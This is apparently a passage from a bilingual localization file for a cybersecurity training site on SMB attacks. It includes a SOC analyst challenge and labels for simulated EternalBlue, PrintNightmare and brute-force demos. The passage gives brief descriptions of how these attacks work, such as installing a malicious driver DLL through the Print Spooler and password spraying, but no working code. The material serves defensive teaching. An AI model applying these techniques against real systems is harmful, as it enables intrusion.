    'smb.challenge.ctx':   { es: 'SIEM alerta: Evento 4624 (tipo 3, NTLM) en 47 sistemas distintos en 8 minutos, todos desde la misma IP interna 10.10.5.22 (workstation de un empleado de contabilidad). Los accesos son a ADMIN$ y C$. Zeek detecta escaneo previo de TCP/445 desde esa misma IP.', en: 'SIEM alerts: Event 4624 (type 3, NTLM) on 47 different systems in 8 minutes, all from the same internal IP 10.10.5.22 (accounting employee workstation). Accesses are to ADMIN$ and C$. Zeek detects prior TCP/445 scan from the same IP.' },
    'smb.challenge.q':     { es: '¿Qué tipo de ataque está ocurriendo? ¿Qué TTPs de MITRE ATT&CK aplican? ¿Qué acciones inmediatas tomas como analista nivel 1? ¿Cómo determinas el alcance del compromiso?', en: 'What type of attack is occurring? What MITRE ATT&CK TTPs apply? What immediate actions do you take as a Level 1 analyst? How do you determine the scope of the compromise?' },
    'smb.demo.eternal.title': "💀 Demo: EternalBlue (MS17-010)",
    'smb.demo.eternal.desc':    { es: 'EternalBlue explota un buffer overflow en SMBv1 para lograr RCE sin autenticación. Fue usado por WannaCry y NotPetya en 2017.', en: 'EternalBlue exploits a buffer overflow in SMBv1 to achieve unauthenticated RCE. Used by WannaCry and NotPetya in 2017.' },
    'smb.demo.eternal.panel': "Configure EternalBlue",
    'smb.demo.eternal.target': "Target (SMBv1):",
    'smb.demo.eternal.os': "Operating system:",
    'smb.demo.eternal.payload': "Payload:",
    'smb.demo.eternal.result': "Exploit result",
    'smb.demo.btn.eternal': "▶ Simulate EternalBlue",
    'smb.demo.print.title': "🖨️ Demo: PrintNightmare (CVE-2021-1675)",
    'smb.demo.print.desc':    { es: 'Vulnerabilidad en el Windows Print Spooler. Permite a cualquier usuario autenticado instalar drivers maliciosos y ejecutar código con privilegios SYSTEM.', en: 'Vulnerability in Windows Print Spooler. Allows any authenticated user to install malicious drivers and execute code with SYSTEM privileges.' },
    'smb.demo.print.panel': "Configure exploit",
    'smb.demo.print.target': "Target IP (Windows):",
    'smb.demo.print.variant': "Variant:",
    'smb.demo.print.btn': "▶ Simulate PrintNightmare",
    'smb.demo.print.result': "Exploit flow",
    'smb.demo.brute.title': "🔑 Demo: SMB Brute Force",
    'smb.demo.brute.desc':    { es: 'Ataque de fuerza bruta contra SMB para descubrir credenciales válidas. Riesgo de lockout de cuentas en entornos con políticas de bloqueo.', en: 'Brute force attack against SMB to discover valid credentials. Risk of account lockout in environments with lockout policies.' },
    'smb.demo.brute.panel': "Configure attack",
    'smb.demo.brute.target': "Target IP:",
    'smb.demo.brute.mode': "Mode:",
    'smb.demo.brute.btn': "▶ Simulate Brute Force",
    'smb.demo.brute.result': "Results",
    'smb.s9.title': "Attack 5: PrintNightmare (CVE-2021-1675/34527)",
    'smb.s9.sub': "Windows Print Spooler — normal user → SYSTEM",
    'smb.s9.p1':     { es: 'PrintNightmare es una vulnerabilidad crítica en el servicio Windows Print Spooler. Cualquier usuario autenticado del dominio puede invocar RpcAddPrinterDriverEx() para instalar un driver DLL malicioso con privilegios SYSTEM.', en: 'PrintNightmare is a critical vulnerability in the Windows Print Spooler service. Any authenticated domain user can invoke RpcAddPrinterDriverEx() to install a malicious DLL driver with SYSTEM privileges.' },
    'smb.s10.title': "Attack 6: SMB Brute Force",
    'smb.s10.sub': "Discover valid SMB credentials through dictionary or spray attacks",
    'smb.s10.p1':    { es: 'SMB expuesto puede ser blanco de ataques de fuerza bruta. Password Spraying prueba pocas contraseñas contra muchos usuarios, evitando el lockout. Credential Stuffing usa listas de credenciales filtradas de breaches anteriores.', en: 'Exposed SMB can be targeted by brute force attacks. Password Spraying tests few passwords against many users, avoiding lockout. Credential Stuffing uses credential lists from previous breaches.' },
});
